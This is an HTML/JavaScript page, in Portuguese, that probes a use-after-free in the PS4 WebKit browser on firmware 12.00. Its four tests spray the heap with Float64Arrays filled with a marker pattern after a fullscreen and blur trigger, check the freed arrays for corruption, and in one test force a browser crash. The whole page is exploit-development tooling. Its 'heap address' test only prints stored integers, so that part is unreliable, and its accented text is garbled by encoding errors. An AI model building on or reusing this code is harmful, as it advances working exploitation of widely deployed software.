<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Diagn√≥stico Avan√ßado</title>
<style>
body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #00ff00; }
button { padding: 15px; margin: 5px; font-size: 16px; cursor: pointer; }
.success { color: #00ff00; }
.error { color: #ff0000; }
.warning { color: #ffaa00; }
.info { color: #00aaff; }
#log { border: 1px solid #333; padding: 10px; margin-top: 20px; max-height: 600px; overflow-y: auto; }
</style>
</head>
<body>
    <h1>PS4 WebKit UAF - Diagn√≥stico Avan√ßado FW 12.00</h1>
    
    <h3>Testes Dispon√≠veis:</h3>
    
    <button onclick="testMemoryLifecycle()" style="background: #0066cc; color: white;">
        üîç TESTE 1: Lifecycle da Mem√≥ria
    </button>
    
    <button onclick="testMultipleStrategies()" style="background: #ff6600; color: white;">
        ‚ö° TESTE 2: M√∫ltiplas Estrat√©gias
    </button>
    
    <button onclick="testForcedCrash()" style="background: #cc0000; color: white;">
        üí• TESTE 3: Crash For√ßado (Sem Detec√ß√£o)
    </button>
    
    <button onclick="testHeapState()" style="background: #9900cc; color: white;">
        üß¨ TESTE 4: Estado do Heap
    </button>
    
    <button onclick="clearLog()" style="background: #666; color: white;">
        üóëÔ∏è LIMPAR LOG
    </button>
    
    <div id="log"></div>
    
    <script>
        let globalArrays = [];
        let globalSpray = [];
        
        function log(msg, type) {
            const div = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            const className = type || 'info';
            div.innerHTML += `<div class="${className}">[${time}] ${msg}</div>`;
            div.scrollTop = div.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            if(clean.length !== 16) return 0.0;
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        const PATTERN = h2f("0x4141414141414141");
        
        // TESTE 1: Verificar lifecycle da mem√≥ria
        function testMemoryLifecycle() {
            clearLog();
            log('‚ïê‚ïê‚ïê TESTE 1: LIFECYCLE DA MEM√ìRIA ‚ïê‚ïê‚ïê', 'success');
            log('');
            log('Este teste verifica se Arrays s√£o realmente liberados no blur', 'info');
            log('Pressione OPTIONS quando solicitado', 'warning');
            log('');
            
            globalArrays = [];
            
            // Criar arrays com valores √∫nicos
            for(let i = 0; i < 3000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                arr[1] = i * 2;
                globalArrays.push(arr);
            }
            
            log(`‚úì Criados ${globalArrays.length} arrays`, 'success');
            log(`‚úì Tamanho aproximado: ${(globalArrays.length * 8 * 8 / 1024).toFixed(2)} KB`, 'info');
            log('');
            log('‚ö†Ô∏è APERTE OPTIONS AGORA!', 'warning');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('', 'info');
                log('üéØ BLUR DETECTADO!', 'success');
                log('', 'info');
                
                // Verificar se arrays ainda existem
                log('Verificando arrays ANTES do spray...', 'info');
                let validBefore = 0;
                for(let i = 0; i < 100; i++) {
                    if(globalArrays[i][0] === i) validBefore++;
                }
                log(`‚úì Arrays v√°lidos antes: ${validBefore}/100`, validBefore === 100 ? 'success' : 'error');
                log('');
                
                // Spray com delay
                log('Executando spray...', 'info');
                globalSpray = [];
                
                for(let i = 0; i < 5000; i++) {
                    const s = new Float64Array(10);
                    s.fill(PATTERN);
                    globalSpray.push(s);
                }
                
                log(`‚úì Spray completo: ${globalSpray.length} arrays`, 'success');
                log('');
                
                // Verificar arrays DEPOIS do spray
                log('Verificando arrays DEPOIS do spray...', 'info');
                let validAfter = 0;
                let corrupted = 0;
                
                for(let i = 0; i < globalArrays.length; i++) {
                    const val = globalArrays[i][0];
                    
                    if(val === i) {
                        validAfter++;
                    } else if(val === PATTERN) {
                        corrupted++;
                        log(`üí• CORROMPIDO! globalArrays[${i}][0] = ${f2h(val)}`, 'error');
                        
                        // Mostrar mais detalhes
                        for(let j = 0; j < 8; j++) {
                            log(`   [${j}] = ${f2h(globalArrays[i][j])}`, 'warning');
                        }
                    }
                }
                
                log('');
                log('‚ïê‚ïê‚ïê RESULTADO ‚ïê‚ïê‚ïê', 'success');
                log(`Arrays v√°lidos: ${validAfter}/${globalArrays.length}`, validAfter === globalArrays.length ? 'success' : 'warning');
                log(`Arrays corrompidos: ${corrupted}`, corrupted > 0 ? 'error' : 'info');
                
                if(corrupted === 0) {
                    log('', 'info');
                    log('‚ùå UAF N√ÉO DETECTADO', 'error');
                    log('Poss√≠veis causas:', 'warning');
                    log('  1. Arrays n√£o foram liberados no blur', 'warning');
                    log('  2. Heap segregation impediu overlap', 'warning');
                    log('  3. GC n√£o rodou ou rodou em momento errado', 'warning');
                } else {
                    log('', 'info');
                    log('‚úÖ UAF CONFIRMADO!', 'success');
                }
            };
        }
        
        // TESTE 2: M√∫ltiplas estrat√©gias
        function testMultipleStrategies() {
            clearLog();
            log('‚ïê‚ïê‚ïê TESTE 2: M√öLTIPLAS ESTRAT√âGIAS ‚ïê‚ïê‚ïê', 'success');
            log('');
            log('Tentando 3 estrat√©gias diferentes de spray', 'info');
            log('');
            
            globalArrays = [];
            
            for(let i = 0; i < 2000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                globalArrays.push(arr);
            }
            
            log(`‚úì ${globalArrays.length} arrays criados`, 'success');
            log('‚ö†Ô∏è APERTE OPTIONS!', 'warning');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('üéØ BLUR!', 'success');
                log('');
                
                // Estrat√©gia 1: Spray pequeno e r√°pido
                log('Estrat√©gia 1: Spray pequeno (2000 arrays)...', 'info');
                let spray1 = [];
                for(let i = 0; i < 2000; i++) {
                    const s = new Float64Array(8);
                    s.fill(PATTERN);
                    spray1.push(s);
                }
                
                let found1 = checkCorruption(globalArrays, '1');
                log('');
                
                // Estrat√©gia 2: Spray m√©dio
                log('Estrat√©gia 2: Spray m√©dio (5000 arrays)...', 'info');
                let spray2 = [];
                for(let i = 0; i < 5000; i++) {
                    const s = new Float64Array(10);
                    s.fill(PATTERN);
                    spray2.push(s);
                }
                
                let found2 = checkCorruption(globalArrays, '2');
                log('');
                
                // Estrat√©gia 3: Spray grande e lento
                log('Estrat√©gia 3: Spray grande (10000 arrays)...', 'info');
                let spray3 = [];
                for(let i = 0; i < 10000; i++) {
                    const s = new Float64Array(12);
                    s.fill(PATTERN);
                    spray3.push(s);
                }
                
                let found3 = checkCorruption(globalArrays, '3');
                log('');
                
                log('‚ïê‚ïê‚ïê RESULTADO FINAL ‚ïê‚ïê‚ïê', 'success');
                log(`Estrat√©gia 1: ${found1 ? '‚úÖ SUCESSO' : '‚ùå FALHOU'}`, found1 ? 'success' : 'error');
                log(`Estrat√©gia 2: ${found2 ? '‚úÖ SUCESSO' : '‚ùå FALHOU'}`, found2 ? 'success' : 'error');
                log(`Estrat√©gia 3: ${found3 ? '‚úÖ SUCESSO' : '‚ùå FALHOU'}`, found3 ? 'success' : 'error');
                
                globalSpray = [spray1, spray2, spray3];
            };
        }
        
        function checkCorruption(arrays, label) {
            for(let i = 0; i < arrays.length; i++) {
                if(arrays[i][0] === PATTERN) {
                    log(`‚úÖ Estrat√©gia ${label}: Corrompido em arrays[${i}]`, 'success');
                    return true;
                }
            }
            log(`‚ùå Estrat√©gia ${label}: Sem corrup√ß√£o`, 'error');
            return false;
        }
        
        // TESTE 3: Crash for√ßado SEM detec√ß√£o
        function testForcedCrash() {
            clearLog();
            log('‚ïê‚ïê‚ïê TESTE 3: CRASH FOR√áADO ‚ïê‚ïê‚ïê', 'error');
            log('');
            log('‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è ATEN√á√ÉO ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è', 'error');
            log('Este teste VAI crashar o navegador', 'error');
            log('MESMO SE o UAF n√£o for detectado!', 'warning');
            log('', 'info');
            log('Objetivo: Verificar se document.write() ap√≥s fullscreen', 'info');
            log('causa crash independente de corrup√ß√£o detect√°vel', 'info');
            log('');
            
            globalArrays = [];
            for(let i = 0; i < 3000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                globalArrays.push(arr);
            }
            
            log('‚úì Arrays criados', 'success');
            log('‚ö†Ô∏è APERTE OPTIONS!', 'warning');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('üéØ BLUR detectado!', 'success');
                log('');
                
                // Spray
                globalSpray = [];
                for(let i = 0; i < 6000; i++) {
                    const s = new Float64Array(10);
                    s.fill(PATTERN);
                    globalSpray.push(s);
                }
                
                log('‚úì Spray executado', 'success');
                log('');
                
                // Verificar
                let detected = false;
                for(let i = 0; i < globalArrays.length; i++) {
                    if(globalArrays[i][0] === PATTERN) {
                        detected = true;
                        log(`‚úÖ UAF detectado em [${i}]`, 'success');
                        break;
                    }
                }
                
                if(!detected) {
                    log('‚ùå UAF N√ÉO DETECTADO', 'error');
                }
                
                log('', 'info');
                log('üí• EXECUTANDO CRASH EM 3 SEGUNDOS...', 'error');
                log('üí• (Independente de detec√ß√£o!)', 'error');
                
                setTimeout(function() {
                    log('üí• CRASH AGORA!', 'error');
                    document.open();
                    document.write('<html><body><h1>CRASH TEST</h1></body></html>');
                    document.close();
                    setTimeout(() => location.reload(), 500);
                }, 3000);
            };
        }
        
        // TESTE 4: Estado do heap
        function testHeapState() {
            clearLog();
            log('‚ïê‚ïê‚ïê TESTE 4: AN√ÅLISE DO HEAP ‚ïê‚ïê‚ïê', 'success');
            log('');
            log('Analisando padr√µes de aloca√ß√£o de mem√≥ria', 'info');
            log('');
            
            // Testar diferentes tamanhos
            const sizes = [4, 8, 16, 32, 64];
            const results = [];
            
            for(let size of sizes) {
                log(`Testando Float64Array(${size})...`, 'info');
                
                const test = [];
                for(let i = 0; i < 1000; i++) {
                    const arr = new Float64Array(size);
                    arr[0] = i;
                    test.push(arr);
                }
                
                // Verificar endere√ßos (aproxima√ß√£o)
                const addr1 = f2h(test[0][0]);
                const addr2 = f2h(test[1][0]);
                
                results.push({
                    size: size,
                    arrays: test.length,
                    sample1: addr1,
                    sample2: addr2
                });
                
                log(`  Amostra[0]: ${addr1}`, 'warning');
                log(`  Amostra[1]: ${addr2}`, 'warning');
            }
            
            log('');
            log('‚ïê‚ïê‚ïê AN√ÅLISE ‚ïê‚ïê‚ïê', 'success');
            for(let r of results) {
                log(`Float64Array(${r.size}): ${r.arrays} arrays criados`, 'info');
            }
            
            log('');
            log('üí° Execute TESTE 1 ap√≥s este para verificar', 'info');
            log('   se o heap est√° "quente" e mais suscet√≠vel', 'info');
        }
    </script>
</body>
</html>
